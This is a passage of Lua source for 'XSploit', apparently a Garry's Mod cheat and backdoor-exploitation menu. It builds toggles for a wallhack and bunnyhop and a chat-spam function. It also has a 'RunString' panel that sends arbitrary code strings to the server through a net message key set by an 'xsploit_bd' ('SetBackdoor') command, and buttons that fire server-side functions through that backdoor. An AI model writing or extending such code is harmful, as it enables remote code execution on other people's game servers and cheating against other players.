					self.lerp = Lerp( FrameTime() * 6, self.lerp, 0 )
				end
			end
			wh2.DoClick = function()
				if wh2on then
					wh2on = false
					hook.Remove( 'HUDPaint', 'XWallHack' )
				else
					wh2on = true
					ToggleWH2()
				end
			end

			local bhop = vgui.Create( 'DButton', flabel )
			bhop:SetPos( 20, 195 )
			bhop:SetSize( 200, 50 )
			bhop:SetText('')
			bhop.lerp = 0
			bhop.Paint = function( self, w, h )
				draw.RoundedBox( 0, 0, 0, w, h, Color( 20, 20, 20 ) )
				draw.RoundedBox( 0, 5, 5, 40, 40, Color( 0, 0, 0 ) )
				draw.RoundedBox( 0, 0, h-self.lerp+1, w, 5, Color( 116, 0, 255 ) )
				draw.SimpleText( 'BunnyHop', 'title', w*.3, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER )
				if bhopon then
					draw.SimpleText( '✔', 'checkbox', 25, h/2, Color( 0, 255, 183 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end

				if self:IsHovered() then
					self.lerp = Lerp( FrameTime() * 6, self.lerp, 5 )
				else
					self.lerp = Lerp( FrameTime() * 6, self.lerp, 0 )
				end
			end
			bhop.DoClick = function()
				if bhopon then
					bhopon = false
					hook.Remove( 'Think', 'XBunnyHop' )
					timer.Remove( 'Bhop' )
				else
					bhopon = true
					ToggleBHop()
				end
			end

		end

		function DPage()

			local rstr = ''

			if lastpanel != 'nil' then
				lastpanel:Remove()
			end

			local dlabel = vgui.Create( 'DPanel', xmenu )
			dlabel:SetSize( mw - 120, mh - 70 )
			dlabel:SetPos( 120, 30 )
			dlabel.Paint = function( self, w, h )
			end

			local dpanel = vgui.Create( 'DScrollPanel', dlabel )
			dpanel:SetSize( 250, mh-100 )
			dpanel:SetPos( 400, 15 )
			dpanel.Paint = function( self, w, h )
				draw.RoundedBox( 0, 0, 0, w, h, Color( 30, 30, 30 ) )
			end

			local setprefix = vgui.Create( 'DTextEntry', dlabel )
			setprefix:SetSize( 280, 100 )
		 	setprefix:SetPos( 20, 15 )
			setprefix:SetValue( rpref )
			setprefix:SetMultiline( true )
		  setprefix.OnChange = function( self )
		  	rpref = self:GetValue()
		  end

			local setstring = vgui.Create( 'DTextEntry', dlabel )
			setstring:SetSize( 280, 100 )
		  setstring:SetPos( 20, 130 )
			setstring:SetMultiline( true )
		  setstring.OnChange = function( self )
		  	rstr = self:GetValue()
		    laststring = self:GetValue()
		  end

			local lstring = vgui.Create( 'DTextEntry', dlabel )
			lstring:SetSize( 280, 35 )
		  lstring:SetPos( 20, 245 )
		  lstring:SetValue( laststring )

		  local runstring = vgui.Create( 'DButton', dlabel )
			runstring:SetSize( 180, 40 )
		  runstring:SetPos( 60, 300 )
		  runstring:SetText( '' )
		  runstring.lerp = 0
		  runstring.Paint = function( self, w, h )
		     draw.RoundedBox( 0, 0, 0, w, h, Color( 40, 40, 40 ) )

				 if self:IsHovered() then
					 self.lerp = Lerp( FrameTime() * 9, self.lerp, w )
					 draw.RoundedBox( 0, 0, 0, self.lerp, h, Color( 116, 0, 255 ) )
				 else
					 self.lerp = Lerp( FrameTime() * 9, self.lerp, 0 )
					 draw.RoundedBoxEx( 0, 0, 0, self.lerp, h, Color( 116, 0, 255 ) )
				 end

				draw.SimpleText( 'Run', 'title', w/2, h/2, Color( 255, 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
		  end

		  runstring.DoClick = function()

		  	chat.AddText( Color( 116, 0, 255 ), '[X', Color( 255, 255, 255 ), 'Sploit', Color( 116, 0, 255 ), '] ', Color( 220, 20, 60 ), 'RunString: ', Color( 255, 255, 255 ), rpref .. ' ' .. rstr )
			  net.Start( netkey )
			  net.WriteString( rpref .. ' ' .. rstr )
			  net.SendToServer()

		  end

			lastpanel = dlabel

			for i, v in pairs( player.GetAll() ) do

				local dbtn = dpanel:Add( 'DButton' )
				dbtn:SetSize( 250, 35 )
				dbtn:SetText( '' )
				dbtn:Dock( TOP )
				dbtn:DockMargin( 0, 0, 0, 5 )
				dbtn.lerp = 0
				dbtn.Paint = function( self, w, h )
					draw.RoundedBox( 0, 0, 0, w, h, Color( 40, 40, 40 ) )
					draw.RoundedBox( 0, w-10, 0, 10, h, Color( 100, 100, 100 ) )

					if self:IsHovered() then
						self.lerp = Lerp( FrameTime() * 6, self.lerp, 11 )
						draw.RoundedBox( 0, w-10, 0, self.lerp, h, Color( 116, 0, 255 ) )
					else
						self.lerp = Lerp( FrameTime() * 6, self.lerp, 0 )
						draw.RoundedBoxEx( 0, w-10, 0, self.lerp, h, Color( 116, 0, 255 ) )
					end

					draw.SimpleText( v:Nick(), 'txt', w/2, h/2, Color( 255, 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end

				dbtn.DoClick = function()
					SetClipboardText( v:SteamID64() )
				end

			end

		end

		function SPage()

			if lastpanel != 'nil' then
				lastpanel:Remove()
			end

			local spanel = vgui.Create( 'DScrollPanel', xmenu )
			spanel:SetSize( 250, mh-100 )
			spanel:SetPos( 150, 45 )
			spanel.Paint = function( self, w, h )
				draw.RoundedBox( 0, 0, 0, w, h, Color( 30, 30, 30 ) )
			end

			lastpanel = spanel

			for i,v in pairs( mfunctions ) do

				local mbtn = spanel:Add( 'DButton' )
				mbtn:SetSize( 250, 35 )
				mbtn:SetText( '' )
				mbtn:Dock( TOP )
				mbtn:DockMargin( 0, 0, 0, 0 )
				mbtn.lerp = 0
				mbtn.Paint = function( self, w, h )
					draw.RoundedBox( 0, 0, 0, w, h, Color( 40, 40, 40 ) )
					draw.RoundedBox( 0, 0, h-5, w, 5, Color( 100, 100, 100 ) )

					if self:IsHovered() then
						self.lerp = Lerp( FrameTime() * 9, self.lerp, w+1 )
						draw.RoundedBox( 0, 0, h-5, self.lerp, 5, Color( 116, 0, 255 ) )
					else
						self.lerp = Lerp( FrameTime() * 9, self.lerp, 0 )
						draw.RoundedBoxEx( 0, 0, h-5, self.lerp, 5, Color( 116, 0, 255 ) )
					end

					draw.SimpleText( mfunctions[i].name, 'txt', w/2, h/2, Color( 255, 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end

				mbtn.DoClick = function()
					if sfunctions[i].func == 'spam' then
						chatspam = !chatspam
						mspam()
					else
						net.Start( netkey )
						net.WriteString( mfunctions[i].func )
						net.SendToServer()
					end
				end

			end

		end

end

local isclosed = true
local t = 0

hook.Add( 'CreateMove', 'ToggleMenu', function()

    if input.WasKeyPressed( KEY_DELETE ) then

    	t = t + 1
        if t == 1 then
		    if isclosed then
		    	XSMenu()
		    	isclosed = false
		    else
		    	CloseXMenu()
		    	isclosed = true
		    end
		else
			t = 0
		end

    end

end)

concommand.Add( 'xsploit', XSMenu)

concommand.Add( 'xsploit_bd', function( ply, cmd, args )

	netkey = args[1]
	chat.AddText( Color( 116, 0, 255 ), '[X', Color( 255, 255, 255 ), 'Sploit', Color( 116, 0, 255 ), '] ', Color( 220, 20, 60 ), 'SetBackdoor: ', Color( 255, 255, 255 ), netkey )

end )

concommand.Add( 'xsploit_addfriend', function( ply, cmd, args )

	local friend = args[1]
	chat.AddText( Color( 116, 0, 255 ), '[X', Color( 255, 255, 255 ), 'Sploit', Color( 116, 0, 255 ), '] ', Color( 220, 20, 60 ), 'AddFriend: ', Color( 255, 255, 255 ), friend )
	table.Add( friendList, {friend} )
	file.Append( 'xsploit/settings/friends.txt', args[1] .. '/' )

end )

concommand.Add( 'xsploit_remfriend', function( ply, cmd, args )

	local friend = args[1]
	chat.AddText( Color( 116, 0, 255 ), '[X', Color( 255, 255, 255 ), 'Sploit', Color( 116, 0, 255 ), '] ', Color( 220, 20, 60 ), 'RemoveFriend: ', Color( 255, 255, 255 ), friend )
	table.RemoveByValue( friendList, friend )
	local friends = ''
	for i,v in ipairs( friendList ) do
		friends = friends .. v .. '/'
	end
	file.Write( 'xsploit/settings/friends.txt', friends )

end )

concommand.Add( 'xsploit_friends', function( ply, cmd, args )

	for i,v in ipairs( friendList ) do
		chat.AddText( Color( 116, 0, 255 ), '[X', Color( 255, 255, 255 ), 'Sploit', Color( 116, 0, 255 ), '] ', Color( 220, 20, 60 ), 'Friend: ', Color( 255, 255, 255 ), v )
	end

end )

concommand.Add( 'xsploit_debug', function( ply, cmd, args )

	XNotify( 'Some titile', 'there is must be long message, but now it still programming', nil )

end )
